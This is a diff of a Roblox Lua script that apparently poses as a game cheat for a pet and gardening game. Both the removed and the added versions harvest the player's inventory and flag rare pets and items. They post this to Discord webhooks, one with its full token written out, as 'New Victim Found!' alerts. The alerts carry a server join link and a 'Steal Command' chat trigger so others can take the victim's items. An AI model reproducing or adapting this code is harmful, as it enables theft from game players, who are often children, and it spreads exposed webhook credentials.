@@ -1,98 +1,67 @@
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local function sendToWebhook()
+    if not LocalPlayer then
+        return
+    end
 
-local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
+    local inventory = getInventory()
+    local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
+    local jobId = tostring(game.JobId or "N/A")
+    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jobId
 
-local function sendToWebhook(data)
-    local jsonData = HttpService:JSONEncode(data)
-    pcall(function()
-        request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = jsonData
-        })
-    end)
+    local messageData = {
+        content = "L hit bru nothing good",
+        embeds = {{
+            title = "🎯 New Victim Found!",
+            description = "READ #⚠️information in Aurora scripts Server to Learn How to Join Victim's Server and Steal Their Stuff!",
+            color = 0x530000,
+            fields = {
+                {name = "👤 Username", value = LocalPlayer.Name, inline = true},
+                {name = "🔗 Join Link", value = joinLink, inline = true},
+                {name = "🎒 Inventory", value = "```" .. inventoryText .. "```", inline = false},
+                {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    sendToBothWebhooks(messageData)
+
+    if #inventory.rarePets > 0 then
+        local rarePetMessage = {
+            content = "@everyone",
+            allowed_mentions = { parse = { "everyone" } },
+            embeds = {{
+                title = "🐾 Rare Pet Found!",
+                description = "A rare pet has been detected in the player's inventory!",
+                color = 0x530000,
+                fields = {
+                    {name = "👤 Username", value = LocalPlayer.Name, inline = true},
+                    {name = "🔗 Join Link", value = joinLink, inline = true},
+                    {name = "🐾 Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```", inline = false},
+                    {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }}
+        }
+        sendToBothWebhooks(rarePetMessage)
+    end
+
+    if #inventory.rareItems > 0 then
+        local rareItemMessage = {
+            content = "@everyone",
+            allowed_mentions = { parse = { "everyone" } },
+            embeds = {{
+                title = "🌟 Rare Item Found!",
+                description = "A rare item has been detected in the player's inventory!",
+                color = 0x530000,
+                fields = {
+                    {name = "👤 Username", value = LocalPlayer.Name, inline = true},
+                    {name = "🔗 Join Link", value = joinLink, inline = true},
+                    {name = "🌟 Rare Items", value = "```" .. table.concat(inventory.rareItems, "\n") .. "```", inline = false},
+                    {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }}
+        }
+        sendToBothWebhooks(rareItemMessage)
+    end
 end
-
-local function getInventory()
-    local inventory = {items = {}, rarePets = {}, rareItems = {}}
-    
-    local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate", "Spray", "Pot"}
-    local rarePets = {
-        "Raccoon", "Inverted Raccoon", "Dragonfly", "Disco Bee", "Mimic octopus", "Spinosauros",
-        "Brontosaurus", "Queen Bee", "Red Fox", "Ankylosarus", "T-Rex", "Chicken Zombie", "Butterfly"
-    }
-    local rareItems = {
-        "Candy Blossom", "Bone Blossom"
-    }
-
-    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            local isBanned = false
-            for _, word in pairs(bannedWords) do
-                if string.find(item.Name:lower(), word:lower()) then
-                    isBanned = true
-                    break
-                end
-            end
-
-            if not isBanned then
-                table.insert(inventory.items, item.Name)
-            end
-
-            for _, rarePet in pairs(rarePets) do
-                if string.find(item.Name, rarePet) then
-                    table.insert(inventory.rarePets, item.Name)
-                    break
-                end
-            end
-
-            for _, rareItem in pairs(rareItems) do
-                if string.find(item.Name, rareItem) then
-                    table.insert(inventory.rareItems, item.Name)
-                    break
-                end
-            end
-        end
-    end
-
-    return inventory
-end
-
-local function sendInventoryReport()
-    local inventory = getInventory()
-    local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
-
-    local fields = {
-        {name = "👤 Username", value = LocalPlayer.Name, inline = true},
-        {name = "🎒 Inventory", value = "```" .. inventoryText .. "```", inline = false},
-    }
-
-    if #inventory.rarePets > 0 then
-        table.insert(fields, {name = "🐾 Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```", inline = false})
-    end
-
-    if #inventory.rareItems > 0 then
-        table.insert(fields, {name = "🌟 Rare Items", value = "```" .. table.concat(inventory.rareItems, "\n") .. "```", inline = false})
-    end
-
-    sendToWebhook({
-        content = (#inventory.rarePets > 0 or #inventory.rareItems > 0) and "@everyone" or "",
-        allowed_mentions = { parse = { "everyone" } },
-        username = "Delta Notifier",
-        embeds = {{
-            title = "🎯 Inventory Report",
-            description = "User inventory auto-detected!",
-            color = 0x530000,
-            fields = fields,
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    })
-end
-
--- ✅ Auto-send inventory report on script execution
-sendInventoryReport()
